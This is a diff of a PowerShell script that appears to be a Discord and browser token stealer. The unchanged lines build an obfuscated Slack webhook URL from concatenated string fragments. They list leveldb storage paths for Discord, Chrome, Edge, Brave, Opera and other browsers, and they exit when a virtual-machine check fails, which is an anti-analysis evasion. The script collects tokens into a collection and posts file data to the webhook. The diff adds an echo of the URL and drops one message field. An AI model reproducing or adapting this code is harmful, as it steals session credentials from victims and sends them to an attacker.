@@ -1,3 +1,5 @@
+
+
 $uriSlack = "https://h"+"ook"+"s.sla"+"ck"+".com/serv"+"ices/T01Q"+"U9DSY2U/B050"+"L0VV73R/"+"2Xf6XxXxhAXOO"+"zgxxWrz9Tf3"
 
 $roaming=$env:APPDATA
@@ -5,6 +7,7 @@ $local=$env:LOCALAPPDATA
 $db_path=@("$roaming\Discord\Local Storage\leveldb","$roaming\discordcanary\Local Storage\leveldb","$roaming\discordptb\Local Storage\leveldb","$roaming\Lightcord\Local Storage\leveldb","$roaming\DiscordDevelopment\Local Storage\leveldb","$roaming\Opera Software\Opera Stable\Local Storage\leveldb","$roaming\Opera Software\Opera GX Stable\Local Storage\leveldb","$local\Amigo\User Data\Local Storage\leveldb","$local\Torch\User Data\Local Storage\leveldb","$local\Kometa\User Data\Local Storage\leveldb","$local\Orbitum\User Data\Local Storage\leveldb","$local\CentBrowser\User Data\Local Storage\leveldb","$local\7Star\7Star\User Data\Local Storage\leveldb","$local\Sputnik\Sputnik\User Data\Local Storage\leveldb","$local\Vivaldi\User Data\Default\Local Storage\leveldb","$local\Google\Chrome SxS\User Data\Local Storage\leveldb","$local\Epic Privacy Browser\User Data\Local Storage\leveldb","$local\Google\Chrome\User Data\Default\Local Storage\leveldb","$local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb","$local\Microsoft\Edge\User Data\Default\Local Storage\leveldb","$local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb","$local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb","$local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
 $vmcheck = Get-WmiObject -Query "Select * From Win32_CacheMemory"
 if (!$vmcheck) {Stop-Process -Id $pid -Force} else {
+    echo $uriSlack
     $token = new-object System.Collections.Specialized.StringCollection
     foreach ($path in $db_path) {
         if (Test-Path $path) {
@@ -75,13 +78,7 @@ if (!$vmcheck) {Stop-Process -Id $pid -Force} else {
                 title_link = "https://example.com"
                 text = $fileData
                 color = "good"
-                fields = @(
-                    @{
-                        title = "File data"
-                        value = $contents
-                        short = $false
-                    }
-                )
+                
             }
         )
     }
